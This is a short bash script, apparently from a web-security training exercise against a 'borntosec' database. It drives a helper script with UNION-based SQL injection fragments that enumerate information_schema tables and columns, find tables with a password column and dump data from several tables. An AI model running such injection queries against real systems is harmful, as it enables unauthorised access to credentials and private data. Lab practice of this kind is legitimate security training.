#!/bin/bash

# python union_enumerator.py "table_name from information_schema.tables"
# # db_default
# # users
# # guestbook
# # list_images
# # vote_dbs
# python union_enumerator.py "column_name from information_schema.columns"
# # ...
# # password
# # ...
# python union_enumerator.py "table_name from information_schema.columns where column_name =" "password"
# # db_default
python union_enumerator.py "column_name from information_schema.columns where table_name =" "users"
python union_enumerator.py "column_name from information_schema.columns where table_name =" "guestbook"
python union_enumerator.py "column_name from information_schema.columns where table_name =" "list_images"
python union_enumerator.py "column_name from information_schema.columns where table_name =" "vote_dbs"
python union_enumerator.py "column_name from information_schema.columns where table_name =" "db_default"
# python union_enumerator.py "id from db_default"
# python union_enumerator.py "grantee from information_schema.user_privileges"
# python union_enumerator.py "id from borntosec.db_default"
python union_enumerator.py "subject from borntosec.vote_dbs"
